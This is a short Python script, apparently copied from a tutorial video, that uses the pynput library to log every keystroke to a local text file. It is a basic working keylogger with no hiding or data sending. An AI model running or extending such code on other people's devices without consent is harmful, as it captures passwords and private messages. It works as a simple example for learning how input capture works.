#Code directly from 'https://www.youtube.com/watch?v=mDY3v2Xx-Q4'
#In orer to run you must have pynput library installed and input access allowed for VS Code

from pynput import keyboard

def keypressed(key):
    print(str(key))
    #Start writing to a text file
    with open("keyfile.txt", 'a') as logkey:
        try:
            char = key.char
            logkey.write(char)
        #In the event that there is an error when various keys are pressed
        except:
            print("Error getting char")

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keypressed)
    listener.start()
    input()
